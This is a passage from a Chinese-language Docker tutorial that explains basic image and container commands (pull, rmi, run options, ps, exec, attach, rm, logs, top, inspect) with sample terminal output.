<td align="left"><strong>–disable-content-trust</strong></td>
<td align="left"><strong>忽略镜像的校验,默认开启</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下载镜像 docker pull 镜像名[:tag]</span><br><span class="line">[root@VM-0-15-centos ~]# docker pull mysql</span><br><span class="line">Using default tag: latest  #如果不写tag，默认就是latest</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">e1acddbe380c: Pull complete   #分层下载，docker image的核心  联合文件系统</span><br><span class="line">bed879327370: Pull complete</span><br><span class="line">03285f80bafd: Pull complete</span><br><span class="line">ccc17412a00a: Pull complete</span><br><span class="line">1f556ecc09d1: Pull complete</span><br><span class="line">adc5528e468d: Pull complete</span><br><span class="line">1afc286d5d53: Pull complete</span><br><span class="line">6c724a59adff: Pull complete</span><br><span class="line">0f2345f8b0a3: Pull complete</span><br><span class="line">c8461a25b23b: Pull complete</span><br><span class="line">3adb49279bed: Pull complete</span><br><span class="line">77f22cd6c363: Pull complete</span><br><span class="line">Digest: sha256:d45561a65aba6edac77be36e0a53f0c1fba67b951cb728348522b671ad63f926  #签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest    #真实地址</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">等价关系</span></span><br><span class="line">docker pull mysql</span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">指定版本下载</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">e1acddbe380c: Already exists</span><br><span class="line">bed879327370: Already exists</span><br><span class="line">03285f80bafd: Already exists</span><br><span class="line">ccc17412a00a: Already exists</span><br><span class="line">1f556ecc09d1: Already exists</span><br><span class="line">adc5528e468d: Already exists</span><br><span class="line">1afc286d5d53: Already exists</span><br><span class="line">4d2d9261e3ad: Pull complete</span><br><span class="line">ac609d7b31f8: Pull complete</span><br><span class="line">53ee1339bc3a: Pull complete</span><br><span class="line">b0c0a831a707: Pull complete</span><br><span class="line">Digest: sha256:7cf2e7d7ff876f93c8601406a5aa17484e6623875e64e7acc71432ad8e0a3d7e</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">下载REPOSITORY为mysql的所有镜像</span></span><br><span class="line">docker pull -a mysql</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630199631481-4c548cbe-026f-45cf-b9d9-79e46651a61d.png" alt="img"></p>
<h2 id="4、删除镜像"><a href="#4、删除镜像" class="headerlink" title="4、删除镜像"></a>4、删除镜像</h2><p>&emsp;&emsp;<code>docker rmi</code>  删除本地一个或多个镜像</p>
<p>&emsp;&emsp;语法：<code>docker rmi [OPTIONS] IMAGE [IMAGE...]</code></p>
<p>&emsp;&emsp;OPTIONS说明：</p>
<table>
<thead>
<tr>
<th align="left"><strong>-f</strong></th>
<th align="left"><strong>强制删除</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>–no-prune</strong></td>
<td align="left"><strong>不移除该镜像的过程镜像，默认移除</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]# docker rmi -f 镜像id   #强制删除指定的镜像</span><br><span class="line">[root@VM-0-15-centos ~]# docker rmi -f 镜像id 镜像id 镜像id  #强制删除多个指定的镜像</span><br><span class="line">[root@VM-0-15-centos ~]# docker rmi -f $(docker images -aq)   #强制删除所有的镜像</span><br></pre></td></tr></table></figure>

<h1 id="三、容器命令"><a href="#三、容器命令" class="headerlink" title="三、容器命令"></a>三、容器命令</h1><p><strong>说明：</strong>我们有了镜像才可以创建容器，Linux系统下下载一个CentOS镜像来测试学习</p>
<p>&emsp;&emsp;<code>docker pull centos</code>  </p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630200299896-427ccc57-02f0-4ca6-b1b3-578945e2dbc5.png" alt="img"></p>
<h2 id="1、新建容器并运行命令"><a href="#1、新建容器并运行命令" class="headerlink" title="1、新建容器并运行命令"></a>1、新建容器并运行命令</h2><p>&emsp;&emsp;<code>docker run</code>  创建一个新的容器并运行一个命令</p>
<p>&emsp;&emsp;<strong>语法：</strong><code>docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</code></p>
<p>&emsp;&emsp;OPTIONS说明：</p>
<table>
<thead>
<tr>
<th align="left"><strong>-d, –detach=false</strong></th>
<th align="left"><strong>指定容器运行于前台还是后台，默认为false，为true则后台运行</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>-i, –interactive=false</strong></td>
<td align="left"><strong>打开STDIN，用于控制台交互</strong></td>
</tr>
<tr>
<td align="left"><strong>-t, –tty=false</strong></td>
<td align="left"><strong>分配tty设备，该可以支持终端登录，默认为false</strong></td>
</tr>
<tr>
<td align="left"><strong>-u, –user=””</strong></td>
<td align="left"><strong>指定容器的用户</strong></td>
</tr>
<tr>
<td align="left"><strong>-a, –attach=[]</strong></td>
<td align="left"><strong>登录容器（必须是以docker run -d启动的容器）</strong></td>
</tr>
<tr>
<td align="left"><strong>-w, –workdir=””</strong></td>
<td align="left"><strong>指定容器的工作目录</strong></td>
</tr>
<tr>
<td align="left"><strong>-c, –cpu-shares=0</strong></td>
<td align="left"><strong>设置容器CPU权重，在CPU共享场景使用</strong></td>
</tr>
<tr>
<td align="left"><strong>-e, –env=[]</strong></td>
<td align="left"><strong>指定环境变量，容器中可以使用该环境变量</strong></td>
</tr>
<tr>
<td align="left"><strong>-m, –memory=””</strong></td>
<td align="left"><strong>指定容器的内存上限</strong></td>
</tr>
<tr>
<td align="left"><strong>-P, –publish-all=false</strong></td>
<td align="left"><strong>随机指定容器暴露的端口</strong></td>
</tr>
<tr>
<td align="left"><strong>-p, –publish=[]</strong></td>
<td align="left"><strong>指定容器暴露的端口</strong></td>
</tr>
<tr>
<td align="left"><strong>-h, –hostname=””</strong></td>
<td align="left"><strong>指定容器的主机名</strong></td>
</tr>
<tr>
<td align="left"><strong>-v, –volume=[]</strong></td>
<td align="left"><strong>给容器挂载存储卷，挂载到容器的某个目录</strong></td>
</tr>
<tr>
<td align="left"><strong>–volumes-from=[]</strong></td>
<td align="left"><strong>给容器挂载其他容器上的卷，挂载到容器的某个目录</strong></td>
</tr>
<tr>
<td align="left"><strong>–cap-add=[]</strong></td>
<td align="left"><strong>添加权限，权限清单详见：</strong><a href="http://linux.die.net/man/7/capabilities"><strong>http://linux.die.net/man/7/capabilities</strong></a></td>
</tr>
<tr>
<td align="left"><strong>–cap-drop=[]</strong></td>
<td align="left"><strong>删除权限，权限清单详见：</strong><a href="http://linux.die.net/man/7/capabilities"><strong>http://linux.die.net/man/7/capabilities</strong></a></td>
</tr>
<tr>
<td align="left"><strong>–cidfile=””</strong></td>
<td align="left"><strong>运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法</strong></td>
</tr>
<tr>
<td align="left"><strong>–cpuset=””</strong></td>
<td align="left"><strong>设置容器可以使用哪些CPU，此参数可以用来容器独占CPU</strong></td>
</tr>
<tr>
<td align="left"><strong>–device=[]</strong></td>
<td align="left"><strong>添加主机设备给容器，相当于设备直通</strong></td>
</tr>
<tr>
<td align="left"><strong>–dns=[]</strong></td>
<td align="left"><strong>指定容器的dns服务器</strong></td>
</tr>
<tr>
<td align="left"><strong>–dns-search=[]</strong></td>
<td align="left"><strong>指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件</strong></td>
</tr>
<tr>
<td align="left"><strong>–entrypoint=””</strong></td>
<td align="left"><strong>覆盖image的入口点</strong></td>
</tr>
<tr>
<td align="left"><strong>–env-file=[]</strong></td>
<td align="left"><strong>指定环境变量文件，文件格式为每行一个环境变量</strong></td>
</tr>
<tr>
<td align="left"><strong>–expose=[]</strong></td>
<td align="left"><strong>指定容器暴露的端口，即修改镜像的暴露端口</strong></td>
</tr>
<tr>
<td align="left"><strong>–link=[]</strong></td>
<td align="left"><strong>指定容器间的关联，使用其他容器的IP、env等信息</strong></td>
</tr>
<tr>
<td align="left"><strong>–lxc-conf=[]</strong></td>
<td align="left"><strong>指定容器的配置文件，只有在指定–exec-driver=lxc时使用</strong></td>
</tr>
<tr>
<td align="left"><strong>–name=””</strong></td>
<td align="left"><strong>指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字</strong></td>
</tr>
<tr>
<td align="left"><strong>–net=”bridge”</strong></td>
<td align="left"><strong>容器网络设置:   使用docker daemon指定的网桥</strong></td>
</tr>
<tr>
<td align="left"><strong>–net=”host”</strong></td>
<td align="left"><strong>容器网络设置:</strong>  <strong>容器使用主机的网络</strong></td>
</tr>
<tr>
<td align="left"><strong>–net=”container”</strong></td>
<td align="left"><strong>容器网络设置:</strong> <strong>使用其他容器的网路，共享IP和PORT等网络资源</strong></td>
</tr>
<tr>
<td align="left"><strong>–net=”none”</strong></td>
<td align="left"><strong>容器网络设置:</strong> <strong>容器使用自己的网络（类似–net=bridge），但是不进行配置</strong></td>
</tr>
<tr>
<td align="left"><strong>–privileged=false</strong></td>
<td align="left"><strong>指定容器是否为特权容器，特权容器拥有所有的capabilities</strong></td>
</tr>
<tr>
<td align="left"><strong>–restart=”no”</strong></td>
<td align="left"><strong>容器退出时不重启</strong></td>
</tr>
<tr>
<td align="left"><strong>–restart=”on-failure”</strong></td>
<td align="left"><strong>容器故障退出（返回值非零）时重启</strong></td>
</tr>
<tr>
<td align="left"><strong>–restart=”always”</strong></td>
<td align="left"><strong>容器退出时总是重启</strong></td>
</tr>
<tr>
<td align="left"><strong>–rm=false</strong></td>
<td align="left"><strong>指定容器停止后自动删除容器(不支持以docker run -d启动的容器)</strong></td>
</tr>
<tr>
<td align="left"><strong>–sig-proxy=true</strong></td>
<td align="left"><strong>设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理</strong></td>
</tr>
</tbody></table>
<p>&emsp;&emsp;常用命令参数</p>
<table>
<thead>
<tr>
<th align="left">-d</th>
<th align="left"><strong>让容器后台运行</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>-it</strong></td>
<td align="left"><strong>保持标准输入打开（默认为false），让容器保持交互状态，不把阻塞/等待输入当成是任务结束</strong></td>
</tr>
<tr>
<td align="left"><strong>-p 主机端口:容器端口</strong></td>
<td align="left"><strong>#映射容器的端口号</strong></td>
</tr>
<tr>
<td align="left"><strong>-P</strong></td>
<td align="left"><strong>随机映射镜像所需要的端口号</strong></td>
</tr>
<tr>
<td align="left"><strong>-v 主机路径:容器路径</strong></td>
<td align="left"><strong>映射容器的存储卷</strong></td>
</tr>
<tr>
<td align="left"><strong>–rm</strong></td>
<td align="left"><strong>容器运行结束后自动销毁(连尸体都不会有)</strong></td>
</tr>
<tr>
<td align="left"><strong>–name</strong></td>
<td align="left"><strong>设置容器名称</strong></td>
</tr>
<tr>
<td align="left"><strong>–hostname</strong></td>
<td align="left"><strong>设置容器的主机名</strong></td>
</tr>
<tr>
<td align="left"><strong>–restart=always</strong></td>
<td align="left"><strong>设置容器开机自动启动（systemctl start docker，systemctl enable docker搭配）</strong></td>
</tr>
</tbody></table>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1621439023851-08f2a5a0-d14c-4936-ba1e-1d67d90491d4.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">运行一个在后台执行的容器，同时，还能用控制台管理</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -i -t -d centos:latest</span><br><span class="line">e599b223e7e00bda6dd1af7d02248ea83c167e62e97d6a9ad821dc0b8e4c4a53</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">e599b223e7e0   centos:latest   &quot;/bin/bash&quot;   5 seconds ago   Up 4 seconds             lucid_banach</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">运行一个带命令在后台不断执行的容器，不直接展示容器内部信息</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">e599b223e7e0   centos:latest   &quot;/bin/bash&quot;   5 seconds ago   Up 4 seconds             lucid_banach</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d centos:latest ping www.docker.com</span><br><span class="line">626b539eeba4c0fe45770d7db8782bf4f20a9c207fbdc726663700ac150cdd4e</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                 CREATED         STATUS         PORTS     NAMES</span><br><span class="line">626b539eeba4   centos:latest   &quot;ping www.docker.com&quot;   5 seconds ago   Up 4 seconds             nifty_solomon</span><br><span class="line">e599b223e7e0   centos:latest   &quot;/bin/bash&quot;             2 minutes ago   Up 2 minutes             lucid_banach</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">为容器指定一个名字。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">容器暴露80端口，并指定宿主机2021端口与其通信(: 之前是宿主机端口，之后是容器需暴露的端口)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">指定容器内目录与宿主机目录共享(: 之前是宿主机文件夹，之后是容器需共享的文件夹)，</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -it -d --name=centos_server -p 2021:80 -v /etc/www:/var/www centos:latest</span><br><span class="line">1e605144b3c4dc66112c7d8fba0b2dabada1d897523c56dc159705335dba5ae0</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND       CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">1e605144b3c4   centos:latest   &quot;/bin/bash&quot;   3 seconds ago   Up 2 seconds   0.0.0.0:2021-&gt;80/tcp, :::2021-&gt;80/tcp   centos_server</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">测试，启动并进入容器</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker run -it centos /bin/bash</span><br><span class="line">[root@286621faf844 /]# ls    #查看容器内的centos，基础版本，很多命令都不完善</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure>

<h2 id="2、查看运行中的容器"><a href="#2、查看运行中的容器" class="headerlink" title="2、查看运行中的容器"></a>2、查看运行中的容器</h2><p>&emsp;&emsp;<code>docker ps</code> </p>
<p>&emsp;&emsp;<strong>语法：</strong><code>docker ps [OPTIONS]</code></p>
<table>
<thead>
<tr>
<th align="left"><strong>-a</strong></th>
<th align="left"><strong>#查看所有容器，包括未运行的</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>-l</strong></td>
<td align="left"><strong>#查看最后一个运行的容器</strong></td>
</tr>
<tr>
<td align="left"><strong>-n</strong></td>
<td align="left"><strong>#列出最近创建的n个容器</strong></td>
</tr>
<tr>
<td align="left"><strong>–no-trunc</strong></td>
<td align="left"><strong>#不截断输出</strong></td>
</tr>
<tr>
<td align="left"><strong>-q</strong></td>
<td align="left"><strong>#静默模式，只显示容器ID</strong></td>
</tr>
<tr>
<td align="left"><strong>-s</strong></td>
<td align="left"><strong>#显示总的文件大小</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                  CREATED         STATUS                      PORTS     NAMES</span><br><span class="line">286621faf844   centos          &quot;/bin/bash&quot;              6 minutes ago   Exited (0) 4 minutes ago              eloquent_chaplygin</span><br><span class="line">c3740c67c633   hello-world     &quot;/hello&quot;                 2 hours ago     Exited (0) 2 hours ago                agitated_lamarr</span><br><span class="line">dea8fbdd52bb   80x86/typecho   &quot;/entrypoint.sh /app…&quot;   3 months ago    Exited (137) 2 months ago             infallible_blackwell</span><br><span class="line">1663d813cab4   80x86/typecho   &quot;/entrypoint.sh /app…&quot;   3 months ago    Exited (137) 3 months ago             cranky_dirac</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">列出最近创建的2个容器信息</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker ps -n 2</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                  CREATED         STATUS                      PORTS     NAMES</span><br><span class="line">286621faf844   centos          &quot;/bin/bash&quot;              6 minutes ago   Exited (0) 4 minutes ago              eloquent_chaplygin</span><br><span class="line">c3740c67c633   hello-world     &quot;/hello&quot;                 2 hours ago     Exited (0) 2 hours ago                agitated_lamarr</span><br></pre></td></tr></table></figure>

<h2 id="3、退出容器"><a href="#3、退出容器" class="headerlink" title="3、退出容器"></a>3、退出容器</h2><h3 id="（1）容器里面"><a href="#（1）容器里面" class="headerlink" title="（1）容器里面"></a>（1）容器里面</h3><p>&emsp;&emsp;当我们在容器里面的时候，退出容器的方式有多个</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630240757632-395438fb-f66d-4f39-aecb-2a4ed44abb80.png" alt="img"></p>
<h3 id="（2）容器外面"><a href="#（2）容器外面" class="headerlink" title="（2）容器外面"></a>（2）容器外面</h3><p>&emsp;&emsp;<code>docker stop 容器名/id</code></p>
<p>&emsp;&emsp;<code>docker start 容器名/id(已经停止的容器)</code></p>
<h2 id="4、进入当前正在运行的容器"><a href="#4、进入当前正在运行的容器" class="headerlink" title="4、进入当前正在运行的容器"></a>4、进入当前正在运行的容器</h2><p>&emsp;&emsp;<code>docker attach 容器id</code>      #从前台进入容器（进入后exit退出了就会杀死容器）</p>
<p>&emsp;&emsp;<code>docker exec -it 容器id bash</code>      #从后门进入容器（进入后exit退出了只是退出了bash，并不会杀死容器）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">我们通常容器都是使用后台方式运行的，需要进入容器，修改一些配置</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">命令</span></span><br><span class="line">docker exec -it 容器id bashshell</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">方法一</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">4519755902f9   centos    &quot;/bin/bash&quot;   3 minutes ago   Up 3 minutes             charming_mendeleev</span><br><span class="line">[root@VM-0-15-centos ~]# docker exec -it 4519755902f9 bash</span><br><span class="line">[root@4519755902f9 /]# ps -ef</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root         1     0  0 12:49 pts/0    00:00:00 /bin/bash</span><br><span class="line">root        15     0  0 12:54 pts/1    00:00:00 bash</span><br><span class="line">root        29    15  0 12:54 pts/1    00:00:00 ps -ef</span><br><span class="line">[root@4519755902f9 /]# exit</span><br><span class="line">exit</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">4519755902f9   centos    &quot;/bin/bash&quot;   6 minutes ago   Up 6 minutes             charming_mendeleev</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">方法二</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">4519755902f9   centos    &quot;/bin/bash&quot;   6 minutes ago   Up 6 minutes             charming_mendeleev</span><br><span class="line">[root@VM-0-15-centos ~]# docker attach 4519755902f9</span><br><span class="line">[root@4519755902f9 /]# exit</span><br><span class="line">exit</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">docker <span class="built_in">exec</span>   <span class="comment">#进入容器后开启一个新的终端，可以在里面操作（常用）</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">docker attach <span class="comment">#进入容器正在执行的终端，不会启动新的终端</span></span></span><br></pre></td></tr></table></figure>

<h2 id="5、启动和停止容器的操作"><a href="#5、启动和停止容器的操作" class="headerlink" title="5、启动和停止容器的操作"></a>5、启动和停止容器的操作</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker start 容器id      #启动容器</span><br><span class="line">docker restart 容器id    #重启容器</span><br><span class="line">docker stop 容器id       #停止当前正在运行的容器</span><br><span class="line">docker kill 容器id       #强制停止当前容器</span><br></pre></td></tr></table></figure>

<h2 id="6、删除容器"><a href="#6、删除容器" class="headerlink" title="6、删除容器"></a>6、删除容器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker rm 容器id    #删除指定的容器，不能删除正在运行的容器，如果要强制删除rm -f</span><br><span class="line">docker rm -f $(docker ps -aq)     #删除所有的容器</span><br><span class="line">docker ps -a -q|xargs docker rm   #删除所有的容器。xargs 可以将管道或标准输入（stdin）数据转                                    换成命令行参数，也能够从文件的输出中读取数据。</span><br></pre></td></tr></table></figure>

<h1 id="四、常用其他命令"><a href="#四、常用其他命令" class="headerlink" title="四、常用其他命令"></a>四、常用其他命令</h1><h2 id="1、后台启动容器"><a href="#1、后台启动容器" class="headerlink" title="1、后台启动容器"></a>1、后台启动容器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -d centos</span><br><span class="line">629a55e2dcbd2c225fa93496c2c3afdda4fe3ecea978178f638cfc246c573021</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -it -d centos</span><br><span class="line">4519755902f94979002e9188463dc3684f34f52ee15ce7fc098a1819f618287b</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">4519755902f9   centos    &quot;/bin/bash&quot;   3 seconds ago   Up 2 seconds             charming_mendeleev</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS                      PORTS     NAMES</span><br><span class="line">4519755902f9   centos    &quot;/bin/bash&quot;   9 seconds ago    Up 8 seconds                          charming_mendeleev</span><br><span class="line">629a55e2dcbd   centos    &quot;/bin/bash&quot;   25 seconds ago   Exited (0) 24 seconds ago             elastic_shockley</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">问题：docker ps发现centos停止了</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">常见的坑：docker容器使用后台运行，就必须要有一个前台进程，docker容器启动后，如果发现自己没有提供服务，就会立即停止</span></span><br></pre></td></tr></table></figure>

<h2 id="2、查看日志"><a href="#2、查看日志" class="headerlink" title="2、查看日志"></a>2、查看日志</h2><p>&emsp;&emsp;<code>docker logs</code> </p>
<p>&emsp;&emsp;<strong>语法：</strong><code>docker logs [OPTIONS] CONTAINER</code></p>
<table>
<thead>
<tr>
<th align="left"><strong>-f</strong></th>
<th align="left"><strong># 跟踪日志输出</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>–since</strong></td>
<td align="left"><strong># 显示某个开始时间的所有日志</strong></td>
</tr>
<tr>
<td align="left"><strong>-t</strong></td>
<td align="left"><strong># 显示时间戳</strong></td>
</tr>
<tr>
<td align="left"><strong>–tail</strong></td>
<td align="left"><strong># 仅列出最新N条容器日志</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">跟踪查看容器的日志输出</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@VM-0-15-centos ~]# docker run -it -d centos ping www.docker.com</span><br><span class="line">436d7e51cf42977ed7683169d0277fa50719e3b74b379e691324c1f9b65b7d2e</span><br><span class="line">[root@VM-0-15-centos ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                 CREATED         STATUS         PORTS     NAMES</span><br><span class="line">436d7e51cf42   centos    &quot;ping www.docker.com&quot;   6 seconds ago   Up 5 seconds             musing_hypatia</span><br><span class="line">[root@VM-0-15-centos ~]# docker logs -f -t --tail 10 436d7e51cf42</span><br><span class="line">2021-08-29T13:03:43.358471450Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=25 ttl=231 time=130 ms</span><br><span class="line">2021-08-29T13:03:44.357885604Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=26 ttl=231 time=128 ms</span><br><span class="line">2021-08-29T13:03:45.360448310Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=27 ttl=231 time=129 ms</span><br><span class="line">2021-08-29T13:03:46.362365414Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=28 ttl=231 time=129 ms</span><br><span class="line">2021-08-29T13:03:49.362508740Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=31 ttl=231 time=129 ms</span><br><span class="line">2021-08-29T13:03:51.364265785Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=33 ttl=231 time=131 ms</span><br><span class="line">2021-08-29T13:03:54.365170137Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=36 ttl=231 time=131 ms</span><br><span class="line">2021-08-29T13:03:56.366807947Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=38 ttl=231 time=131 ms</span><br><span class="line">2021-08-29T13:03:57.366455842Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=39 ttl=231 time=131 ms</span><br><span class="line">2021-08-29T13:03:58.334405609Z 64 bytes from server-65-9-42-78.nrt12.r.cloudfront.net (65.9.42.78): icmp_seq=40 ttl=231 time=97.5 ms</span><br></pre></td></tr></table></figure>

<h2 id="3、查看容器中进程信息"><a href="#3、查看容器中进程信息" class="headerlink" title="3、查看容器中进程信息"></a>3、查看容器中进程信息</h2><p>&emsp;&emsp;<code>docker top 容器ID</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos ~]# docker top 436d7e51cf42</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                5266                5248                0                   21:03               pts/0               00:00:00            ping www.docker.com</span><br></pre></td></tr></table></figure>

<h2 id="4、查看镜像的元数据"><a href="#4、查看镜像的元数据" class="headerlink" title="4、查看镜像的元数据"></a>4、查看镜像的元数据</h2><p>&emsp;&emsp;<code>docker inspect 容器ID</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">测试</span></span><br><span class="line">[root@VM-0-15-centos ~]# docker inspect ec6e3fdec8c7</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;ec6e3fdec8c7c01895d7d47a2ab08c93129c9237a7763f295d37b73f4e327095&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2021-08-29T01:53:05.435416978Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/bin/bash&quot;,</span><br><span class="line">        &quot;Args&quot;: [],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;exited&quot;,</span><br><span class="line">            &quot;Running&quot;: false,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 0,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: 